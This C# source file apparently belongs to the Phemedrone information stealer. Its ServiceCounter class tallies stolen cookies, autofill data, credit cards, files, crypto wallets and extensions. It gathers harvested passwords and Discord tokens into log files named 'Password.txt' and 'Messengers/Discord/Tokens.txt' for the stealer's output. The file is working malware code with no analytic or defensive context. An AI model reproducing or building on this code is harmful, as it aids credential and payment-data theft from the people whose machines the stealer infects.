using System.Collections.Generic;
using System.Linq;
using System.Text;
using Phemedrone.Classes;

namespace Phemedrone
{
    public class ServiceCounter
    {
        public static int CookieCount = 0;
        public static int AutoFillCount = 0;
        public static int CreditCardCount = 0;
        public static int FilesCount = 0;
        public static int WalletsCount = 0;
        public static int ExtensionsCount = 0;
        public static readonly List<string> PasswordList = new();
        public static readonly List<string> DiscordList = new();
        public static List<string> passwordstags = new();
        public static List<string> cookiestags = new();
        public static IEnumerable<LogRecord> Finalize()
        {
            if (PasswordList.Count > 0)
            {
                yield return new LogRecord
                {
                    Path = "Password.txt",
                    Content = Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", PasswordList))
                };
            }

            if (DiscordList.Count > 0)
            {
                yield return new LogRecord
                {
                    Path = "Messengers/Discord/Tokens.txt",
                    Content = Encoding.UTF8.GetBytes(string.Join("\r\n", DiscordList.Distinct()))
                };
            }
        }
        
    }
}